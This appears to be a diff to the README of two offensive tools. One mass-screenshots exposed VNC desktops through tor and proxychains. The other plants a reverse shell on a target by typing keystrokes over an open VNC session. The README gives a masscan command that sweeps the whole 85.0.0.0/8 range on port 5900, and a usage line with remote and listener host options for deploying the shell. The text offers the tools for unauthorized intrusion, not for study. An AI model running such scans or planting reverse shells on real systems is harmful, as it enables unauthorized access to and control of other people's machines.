@@ -1,6 +1,14 @@
-# vncshooter
+# vncshooter & vncshitter
 
-use masscan to gather vnc hosts
+
+**vncshooter** will parse a textfile containing target ip's, extract all ip's, attempt to connect to the target and take a screenshot. (requires tor, proxychains, vncsnapshot)
+
+**vncshitter** can automatically place a reverse shell on a target, by sending keystrokes over a vnc connection (requires vncdotool)
+
+
+
+
+use masscan to gather target ip's
 
 
     sudo masscan -p5900 85.0.0.0/8 --resume paused.conf --rate 10000 >> 85.output
@@ -14,7 +22,7 @@ use vncshooter to take screens
 
 
 
-use vncshitter to deploy shell
+use vncshitter to deploy a shell
 
 
     Usage: ./vncshitter --rhost=x.x.x.x [--rport=5900] [--lhost=x.x.x.x] [--rport=4444] [--platform=linux-gui]
